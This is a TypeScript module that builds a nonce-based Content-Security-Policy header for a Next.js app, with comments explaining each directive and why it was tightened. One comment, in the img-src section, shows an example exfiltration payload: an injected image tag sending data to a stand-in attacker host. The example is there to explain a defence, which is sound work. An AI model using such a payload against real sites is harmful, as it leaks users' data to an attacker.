/**
 * Content-Security-Policy.
 *
 * Built per request, in `src/proxy.ts`, because it carries a nonce.
 *
 * ---------------------------------------------------------------------------
 * Why a nonce, and what a static header was doing wrong
 * ---------------------------------------------------------------------------
 *
 * The previous policy shipped `script-src 'self'` as a static header and called
 * it the strict production setting. It was strict, and it was **breaking the
 * application**: Next emits a small number of inline bootstrap scripts that
 * carry the server-rendered data React needs to hydrate. `'self'` blocks them,
 * so in production every page rendered as static HTML with no interactivity and
 * React reported hydration error #412.
 *
 * It was invisible because the end-to-end suite ran against `next dev`, where
 * script-src also allows `'unsafe-inline'`. Serving an actual production build
 * and reading the console is what surfaced it.
 *
 * A nonce fixes it without loosening anything: the inline scripts Next controls
 * carry the nonce, and an injected one cannot, because the attacker cannot know
 * a value generated after their payload was stored.
 *
 * `'strict-dynamic'` lets a nonced script load the chunks it needs, so the
 * policy does not have to enumerate Next's chunk URLs. In a `'strict-dynamic'`
 * policy, host-source expressions such as `'self'` are ignored by browsers that
 * support it — they are kept for older ones, which is exactly what the spec
 * intends.
 *
 * ---------------------------------------------------------------------------
 * style-src
 * ---------------------------------------------------------------------------
 *
 * Split, and measured rather than assumed — including the part that did not
 * work out.
 *
 * The *served* HTML contains no inline `<style>`: Next emits CSS as external
 * files. But `sonner`, the toast library, injects a `<style>` element from
 * JavaScript after hydration, and a runtime-injected element cannot carry a
 * nonce the server generated. Loading the page with `style-src-elem 'self'` and
 * reading the console is what showed this; the first attempt at this policy
 * assumed the served HTML was the whole story and was wrong.
 *
 * So `'unsafe-inline'` stays on `style-src-elem`, for one named reason rather
 * than as a blanket allowance. Removing it needs sonner replaced or its
 * stylesheet extracted to a file — a real change, not a header edit, and not
 * worth breaking every toast in the product for.
 *
 * `style-src-attr 'unsafe-inline'` remains for a different and permanent
 * reason: React and Recharts set `style` attributes on elements, and no browser
 * supports a nonce for an attribute.
 *
 * What this policy does still buy: an injected `<style>` cannot be *the* vector
 * on its own, because `script-src` has no `'unsafe-inline'` at all — the
 * expensive half is closed.
 *
 * ---------------------------------------------------------------------------
 * img-src
 * ---------------------------------------------------------------------------
 *
 * Narrowed from `https:`, which permitted every host on the internet, to the two
 * hosts `images.remotePatterns` allows. A broad img-src is a ready-made
 * exfiltration channel: a URL is a GET request, and an injected
 * `<img src="https://attacker.test/?d=…">` needs no script at all.
 */

const isProduction = process.env.NODE_ENV === "production";

/**
 * The object-storage origin the browser may PUT to, or null.
 *
 * Only the origin: the presigned URL's path and query carry the key and the
 * signature, and neither belongs in a policy header. Read from the environment
 * rather than from `src/lib/env.ts` because this module is evaluated by the
 * proxy on every request and must stay free of the application's module graph.
 */
function storageOrigin(): string | null {
  const driver = process.env.STORAGE_DRIVER;
  if (!driver || driver === "none") return null;

  const endpoint = process.env.S3_ENDPOINT;
  if (!endpoint) return null;

  try {
    const url = new URL(endpoint);

    // `new URL("https://*")` parses, and its origin is `https://*` — which
    // would put a wildcard into the policy and let an injected script post to
    // any host on the internet. A misconfigured endpoint must fail closed, so
    // the protocol and hostname are checked rather than assumed.
    if (url.protocol !== "https:" && url.protocol !== "http:") return null;
    if (!/^[a-z0-9.-]+$/i.test(url.hostname)) return null;

    return url.origin;
  } catch {
    // A malformed endpoint is a configuration error, not a reason to widen the
    // policy. Uploads will fail visibly; the policy stays closed.
    return null;
  }
}

export function contentSecurityPolicy(nonce: string): string {
  return [
    "default-src 'self'",

    // The nonce is what makes Next's own inline bootstrap run while an injected
    // inline script does not. 'unsafe-eval' stays off in production; development
    // needs it for React refresh.
    `script-src 'nonce-${nonce}' 'strict-dynamic' 'self'${isProduction ? "" : " 'unsafe-eval' 'unsafe-inline'"}`,

    // Fallback for browsers without the split directives below.
    "style-src 'self' 'unsafe-inline'",
    // 'unsafe-inline' for one measured reason: sonner injects its stylesheet
    // from JavaScript at runtime, and a runtime-injected element cannot carry a
    // server-generated nonce.
    "style-src-elem 'self' 'unsafe-inline'",
    // React and Recharts set style attributes; no browser supports a nonce here.
    "style-src-attr 'unsafe-inline'",

    "img-src 'self' data: blob: https://avatars.githubusercontent.com https://lh3.googleusercontent.com",
    "font-src 'self' data:",
    // Document uploads go browser -> object storage directly and never through
    // this application, so the browser has to be allowed to reach exactly one
    // more origin. Without it the upload is blocked by our own policy and the
    // only evidence is a bare "csp" in the network log — which is how this was
    // found, by a browser test, after the same upload had been proven to work
    // from a page that carried no CSP at all.
    //
    // One exact origin, never a wildcard, and only when object storage is
    // actually configured: with `STORAGE_DRIVER` unset this is byte-for-byte
    // the policy that shipped before.
    `connect-src 'self'${storageOrigin() ? ` ${storageOrigin()}` : ""}`,
    "form-action 'self'",
    "frame-ancestors 'none'",
    "frame-src 'none'",
    "object-src 'none'",
    "media-src 'none'",
    // 'none' rather than 'self': the app has no <base> element, and an injected
    // one silently rewrites every relative URL on the page.
    "base-uri 'none'",
    "worker-src 'self' blob:",
    "manifest-src 'self'",
    ...(isProduction ? ["upgrade-insecure-requests"] : []),
  ].join("; ");
}

/**
 * The policy for responses that do not pass through the proxy — API routes and
 * static assets, which never contain a script and so need no nonce.
 */
export const STATIC_CSP = [
  "default-src 'none'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join("; ");
